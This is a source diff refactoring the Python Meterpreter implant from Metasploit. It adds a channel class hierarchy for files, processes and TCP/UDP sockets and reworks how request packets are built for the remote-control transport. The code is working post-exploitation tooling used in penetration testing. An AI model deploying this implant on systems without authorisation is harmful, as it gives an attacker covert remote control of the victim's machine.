@@ -377,38 +377,167 @@ def tlv_pack(*args):
     return data
 
 @export
-def tlv_pack_response(result, response):
-    response += tlv_pack(TLV_TYPE_RESULT, result)
-    response = struct.pack('>I', len(response) + 4) + response
-    return response
+def tlv_pack_request(method, parts=None):
+    pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
+    pkt += tlv_pack(TLV_TYPE_METHOD, method)
+    pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
+    pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
+    parts = parts or []
+    for part in parts:
+        pkt += tlv_pack(part['type'], part['value'])
+    return pkt
 
 #@export
-class MeterpreterFile(object):
+class MeterpreterChannel(object):
+    def core_close(self, request, response):
+        self.close()
+        return ERROR_SUCCESS, response
+
+    def core_eof(self, request, response):
+        response += tlv_pack(TLV_TYPE_BOOL, self.eof())
+        return ERROR_SUCCESS, response
+
+    def core_read(self, request, response):
+        length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
+        response += tlv_pack(TLV_TYPE_CHANNEL_DATA, self.read(length))
+        return ERROR_SUCCESS, response
+
+    def core_write(self, request, response):
+        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
+        response += tlv_pack(TLV_TYPE_LENGTH, self.write(channel_data))
+        return ERROR_SUCCESS, response
+
+    def close(self):
+        raise NotImplementedError()
+
+    def eof(self):
+        return False
+
+    def is_alive(self):
+        return True
+
+    def notify(self):
+        return None
+
+    def read(self, length):
+        raise NotImplementedError()
+
+    def write(self, data):
+        raise NotImplementedError()
+
+#@export
+class MeterpreterFile(MeterpreterChannel):
     def __init__(self, file_obj):
         self.file_obj = file_obj
+        super(MeterpreterFile, self).__init__()
 
-    def __getattr__(self, name):
-        return getattr(self.file_obj, name)
+    def close(self):
+        self.file_obj.close()
+
+    def eof(self):
+        return self.file_obj.tell() >= os.fstat(self.file_obj.fileno()).st_size
+
+    def read(self, length):
+        return self.file_obj.read(length)
+
+    def write(self, data):
+        self.file_obj.write(data)
+        return len(data)
 export(MeterpreterFile)
 
 #@export
-class MeterpreterSocket(object):
+class MeterpreterProcess(MeterpreterChannel):
+    def __init__(self, proc_h):
+        self.proc_h = proc_h
+        super(MeterpreterProcess, self).__init__()
+
+    def close(self):
+        self.proc_h.kill()
+
+    def is_alive(self):
+        return self.proc_h.poll() is None
+
+    def read(self, length):
+        data = ''
+        stdout_reader = self.proc_h.stdout_reader
+        if stdout_reader.is_read_ready():
+            data = stdout_reader.read(length)
+        return data
+
+    def write(self, data):
+        self.proc_h.write(data)
+        return len(data)
+export(MeterpreterProcess)
+
+#@export
+class MeterpreterSocket(MeterpreterChannel):
     def __init__(self, sock):
         self.sock = sock
+        self._is_alive = True
+        super(MeterpreterSocket, self).__init__()
 
-    def __getattr__(self, name):
-        return getattr(self.sock, name)
+    def core_write(self, request, response):
+        try:
+            status, response = super(MeterpreterSocket, self).core_write(request, response)
+        except socket.error:
+            self.close()
+            self._is_alive = False
+            status = ERROR_FAILURE
+        return status, response
+
+    def close(self):
+        return self.sock.close()
+
+    def fileno(self):
+        return self.sock.fileno()
+
+    def is_alive(self):
+        return self._is_alive
+
+    def read(self, length):
+        return self.sock.recv(length)
+
+    def write(self, data):
+        return self.sock.send(data)
 export(MeterpreterSocket)
 
 #@export
-class MeterpreterSocketClient(MeterpreterSocket):
+class MeterpreterSocketTCPClient(MeterpreterSocket):
     pass
-export(MeterpreterSocketClient)
+export(MeterpreterSocketTCPClient)
 
 #@export
-class MeterpreterSocketServer(MeterpreterSocket):
+class MeterpreterSocketTCPServer(MeterpreterSocket):
     pass
-export(MeterpreterSocketServer)
+export(MeterpreterSocketTCPServer)
+
+#@export
+class MeterpreterSocketUDPClient(MeterpreterSocket):
+    def __init__(self, sock, peer_address):
+        super(MeterpreterSocketUDPClient, self).__init__(sock)
+        self.peer_address = peer_address
+
+    def core_write(self, request, response):
+        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
+        peer_host = packet_get_tlv(request, TLV_TYPE_PEER_HOST).get('value', self.peer_address[0])
+        peer_port = packet_get_tlv(request, TLV_TYPE_PEER_PORT).get('value', self.peer_address[1])
+        try:
+            length = self.sock.sendto(channel_data, (peer_host, peer_port))
+        except socket.error:
+            self.close()
+            self._is_alive = False
+            status = ERROR_FAILURE
+        else:
+            response += tlv_pack(TLV_TYPE_LENGTH, length)
+            status = ERROR_SUCCESS
+        return status, response
+
+    def read(self, length):
+        return self.sock.recvfrom(length)[0]
+
+    def write(self, data):
+        self.sock.sendto(data, self.peer_address)
+export(MeterpreterSocketUDPClient)
 
 class STDProcessBuffer(threading.Thread):
     def __init__(self, std, is_alive):
@@ -451,14 +580,17 @@ class STDProcess(subprocess.Popen):
         subprocess.Popen.__init__(self, *args, **kwargs)
         self.echo_protection = False
 
+    def is_alive(self):
+        return self.poll() is None
+
     def start(self):
-        self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() == None)
+        self.stdout_reader = STDProcessBuffer(self.stdout, self.is_alive)
         self.stdout_reader.start()
-        self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() == None)
+        self.stderr_reader = STDProcessBuffer(self.stderr, self.is_alive)
         self.stderr_reader.start()
 
     def write(self, channel_data):
-        self.stdin.write(channel_data)
+        length = self.stdin.write(channel_data)
         self.stdin.flush()
         if self.echo_protection:
             end_time = time.time() + 0.5
@@ -468,6 +600,7 @@ class STDProcess(subprocess.Popen):
                     out_data = self.stdout_reader.peek(len(channel_data))
             if out_data == channel_data:
                 self.stdout_reader.read(len(channel_data))
+        return length
 export(STDProcess)
 
 class Transport(object):
@@ -573,6 +706,7 @@ class Transport(object):
         return result
 
     def send_packet(self, pkt):
+        pkt = struct.pack('>I', len(pkt) + 4) + pkt
         self.request_retire = False
         try:
             self._send_packet(self.encrypt_packet(pkt))
@@ -827,7 +961,9 @@ class PythonMeterpreter(object):
         return func
 
     def add_channel(self, channel):
-        assert(isinstance(channel, (subprocess.Popen, MeterpreterFile, MeterpreterSocket)))
+        if not isinstance(channel, MeterpreterChannel):
+            debug_print('[-] channel object is not an instance of MeterpreterChannel')
+            raise TypeError('invalid channel object')
         idx = self.next_channel_id
         self.channels[idx] = channel
         debug_print('[*] added channel id: ' + str(idx) + ' type: ' + channel.__class__.__name__)
@@ -902,69 +1038,72 @@ class PythonMeterpreter(object):
                     self._transport_sleep = None
                     if not self.transport.activate():
                         self.transport_change()
-                continue
+                    continue
             # iterate over the keys because self.channels could be modified if one is closed
             channel_ids = list(self.channels.keys())
             for channel_id in channel_ids:
                 channel = self.channels[channel_id]
                 data = bytes()
-                if isinstance(channel, STDProcess):
+                write_request_parts = []
+                if isinstance(channel, MeterpreterProcess):
                     if not channel_id in self.interact_channels:
                         continue
-                    if channel.stderr_reader.is_read_ready():
-                        data = channel.stderr_reader.read()
-                    elif channel.stdout_reader.is_read_ready():
-                        data = channel.stdout_reader.read()
-                    elif channel.poll() != None:
+                    proc_h = channel.proc_h
+                    if proc_h.stderr_reader.is_read_ready():
+                        data = proc_h.stderr_reader.read()
+                    elif proc_h.stdout_reader.is_read_ready():
+                        data = proc_h.stdout_reader.read()
+                    elif not channel.is_alive():
                         self.handle_dead_resource_channel(channel_id)
-                elif isinstance(channel, MeterpreterSocketClient):
+                elif isinstance(channel, MeterpreterSocketTCPClient):
                     while select.select([channel.fileno()], [], [], 0)[0]:
                         try:
-                            d = channel.recv(1)
+                            d = channel.read(1)
                         except socket.error:
                             d = bytes()
                         if len(d) == 0:
                             self.handle_dead_resource_channel(channel_id)
                             break
                         data += d
-                elif isinstance(channel, MeterpreterSocketServer):
+                elif isinstance(channel, MeterpreterSocketTCPServer):
                     if select.select([channel.fileno()], [], [], 0)[0]:
-                        (client_sock, client_addr) = channel.accept()
-                        server_addr = channel.getsockname()
-                        client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
-                        pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
-                        pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
-                        pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
-                        pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
-                        pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
-                        pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
-                        pkt += tlv_pack(TLV_TYPE_LOCAL_PORT, server_addr[1])
-                        pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
-                        pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
-                        pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-                        self.send_packet(pkt)
+                        (client_sock, client_addr) = channel.sock.accept()
+                        server_addr = channel.sock.getsockname()
+                        client_channel_id = self.add_channel(MeterpreterSocketTCPClient(client_sock))
+                        self.send_packet(tlv_pack_request('tcp_channel_open', [
+                            {'type': TLV_TYPE_CHANNEL_ID, 'value': client_channel_id},
+                            {'type': TLV_TYPE_CHANNEL_PARENTID, 'value': channel_id},
+                            {'type': TLV_TYPE_LOCAL_HOST, 'value': inet_pton(channel.sock.family, server_addr[0])},
+                            {'type': TLV_TYPE_LOCAL_PORT, 'value': server_addr[1]},
+                            {'type': TLV_TYPE_PEER_HOST, 'value': inet_pton(client_sock.family, client_addr[0])},
+                            {'type': TLV_TYPE_PEER_PORT, 'value': client_addr[1]},
+                        ]))
+                elif isinstance(channel, MeterpreterSocketUDPClient):
+                    if select.select([channel.fileno()], [], [], 0)[0]:
+                        try:
+                            data, peer_address = channel.sock.recvfrom(65535)
+                        except socket.error:
+                            self.handle_dead_resource_channel(channel_id)
+                        else:
+                            write_request_parts.extend([
+                                {'type': TLV_TYPE_PEER_HOST, 'value': peer_address[0]},
+                                {'type': TLV_TYPE_PEER_PORT, 'value': peer_address[1]},
+                            ])
                 if data:
-                    pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
-                    pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
-                    pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
-                    pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
-                    pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
-                    pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
-                    pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
-                    pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-                    self.send_packet(pkt)
+                    write_request_parts.extend([
+                        {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
+                        {'type': TLV_TYPE_CHANNEL_DATA, 'value': data},
+                        {'type': TLV_TYPE_LENGTH, 'value': len(data)},
+                    ])
+                    self.send_packet(tlv_pack_request('core_channel_write', write_request_parts))
 
     def handle_dead_resource_channel(self, channel_id):
         del self.channels[channel_id]
         if channel_id in self.interact_channels:
             self.interact_channels.remove(channel_id)
-        pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
-        pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_close')
-        pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
-        pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
-        pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
-        pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-        self.send_packet(pkt)
+        self.send_packet(tlv_pack_request('core_channel_close', [
+            {'type': TLV_TYPE_CHANNEL_ID, 'value': channel_id},
+        ]))
 
     def _core_set_uuid(self, request, response):
         new_uuid = packet_get_tlv(request, TLV_TYPE_UUID)
@@ -1060,7 +1199,7 @@ class PythonMeterpreter(object):
     def _core_transport_change(self, request, response):
         new_transport = Transport.from_request(request)
         self.transport_add(new_transport)
-        self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
         self.transport_change(new_transport)
         return None
 
@@ -1079,7 +1218,7 @@ class PythonMeterpreter(object):
         new_transport = self.transport_next()
         if new_transport == self.transport:
             return ERROR_FAILURE, response
-        self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
         self.transport_change(new_transport)
         return None
 
@@ -1087,7 +1226,7 @@ class PythonMeterpreter(object):
         new_transport = self.transport_prev()
         if new_transport == self.transport:
             return ERROR_FAILURE, response
-        self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
         self.transport_change(new_transport)
         return None
 
@@ -1127,7 +1266,7 @@ class PythonMeterpreter(object):
 
     def _core_transport_sleep(self, request, response):
         seconds = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT)['value']
-        self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
+        self.send_packet(response + tlv_pack(TLV_TYPE_RESULT, ERROR_SUCCESS))
         if seconds:
             self._transport_sleep = seconds
         return ERROR_SUCCESS, response
@@ -1136,7 +1275,9 @@ class PythonMeterpreter(object):
         channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
         handler = 'channel_open_' + channel_type['value']
         if handler not in self.extension_functions:
+            debug_print('[-] core_channel_open missing handler: ' + handler)
             return error_result(NotImplementedError), response
+        debug_print('[*] core_channel_open dispatching to handler: ' + handler)
         handler = self.extension_functions[handler]
         return handler(request, response)
 
@@ -1145,30 +1286,22 @@ class PythonMeterpreter(object):
         if channel_id not in self.channels:
             return ERROR_FAILURE, response
         channel = self.channels[channel_id]
-        if isinstance(channel, subprocess.Popen):
-            channel.kill()
-        elif isinstance(channel, MeterpreterFile):
-            channel.close()
-        elif isinstance(channel, MeterpreterSocket):
-            channel.close()
-        else:
-            return ERROR_FAILURE, response
-        del self.channels[channel_id]
-        if channel_id in self.interact_channels:
-            self.interact_channels.remove(channel_id)
-        debug_print('[*] closed and removed channel id: ' + str(channel_id))
-        return ERROR_SUCCESS, response
+        status, response = channel.core_close(request, response)
+        if status == ERROR_SUCCESS:
+            del self.channels[channel_id]
+            if channel_id in self.interact_channels:
+                self.interact_channels.remove(channel_id)
+            debug_print('[*] closed and removed channel id: ' + str(channel_id))
+        return status, response
 
     def _core_channel_eof(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
         if channel_id not in self.channels:
             return ERROR_FAILURE, response
         channel = self.channels[channel_id]
-        result = False
-        if isinstance(channel, MeterpreterFile):
-            result = channel.tell() >= os.fstat(channel.fileno()).st_size
-        response += tlv_pack(TLV_TYPE_BOOL, result)
+        status, response = channel.core_eof(request, response)
         return ERROR_SUCCESS, response
+
 
     def _core_channel_interact(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
@@ -1187,67 +1320,42 @@ class PythonMeterpreter(object):
 
     def _core_channel_read(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
-        length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
         if channel_id not in self.channels:
             return ERROR_FAILURE, response
         channel = self.channels[channel_id]
-        data = ''
-        if isinstance(channel, STDProcess):
-            if channel.poll() != None:
-                self.handle_dead_resource_channel(channel_id)
-            if channel.stdout_reader.is_read_ready():
-                data = channel.stdout_reader.read(length)
-        elif isinstance(channel, MeterpreterFile):
-            data = channel.read(length)
-        elif isinstance(channel, MeterpreterSocket):
-            data = channel.recv(length)
-        else:
-            return ERROR_FAILURE, response
-        response += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
-        return ERROR_SUCCESS, response
+        status, response = channel.core_read(request, response)
+        if not channel.is_alive():
+            self.handle_dead_resource_channel(channel_id)
+        return status, response
 
     def _core_channel_write(self, request, response):
         channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
-        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
-        length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
         if channel_id not in self.channels:
             return ERROR_FAILURE, response
         channel = self.channels[channel_id]
-        l = len(channel_data)
-        if isinstance(channel, subprocess.Popen):
-            if channel.poll() != None:
-                self.handle_dead_resource_channel(channel_id)
-                return ERROR_FAILURE, response
-            channel.write(channel_data)
-        elif isinstance(channel, MeterpreterFile):
-            channel.write(channel_data)
-        elif isinstance(channel, MeterpreterSocket):
-            try:
-                l = channel.send(channel_data)
-            except socket.error:
-                channel.close()
-                self.handle_dead_resource_channel(channel_id)
-                return ERROR_FAILURE, response
-        else:
-            return ERROR_FAILURE, response
-        response += tlv_pack(TLV_TYPE_LENGTH, l)
-        return ERROR_SUCCESS, response
+        status = ERROR_FAILURE
+        if channel.is_alive():
+            status, response = channel.core_write(request, response)
+        # evaluate channel.is_alive() twice because it could have changed
+        if not channel.is_alive():
+            self.handle_dead_resource_channel(channel_id)
+        return status, response
 
     def create_response(self, request):
-        resp = struct.pack('>I', PACKET_TYPE_RESPONSE)
+        response = struct.pack('>I', PACKET_TYPE_RESPONSE)
         method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
-        resp += tlv_pack(method_tlv)
-        resp += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
+        response += tlv_pack(method_tlv)
+        response += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 
         handler_name = method_tlv['value']
         if handler_name in self.extension_functions:
             handler = self.extension_functions[handler_name]
             try:
                 debug_print('[*] running method ' + handler_name)
-                result = handler(request, resp)
+                result = handler(request, response)
                 if result is None:
                     return
-                result, resp = result
+                result, response = result
             except Exception:
                 debug_traceback('[-] method ' + handler_name + ' resulted in an error')
                 result = error_result()
@@ -1261,8 +1369,8 @@ class PythonMeterpreter(object):
         reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
         if not reqid_tlv:
             return
-        resp += tlv_pack(reqid_tlv)
-        return tlv_pack_response(result, resp)
+        response += tlv_pack(reqid_tlv)
+        return response + tlv_pack(TLV_TYPE_RESULT, result)
 
 _try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
 if not _try_to_fork or (_try_to_fork and os.fork() == 0):
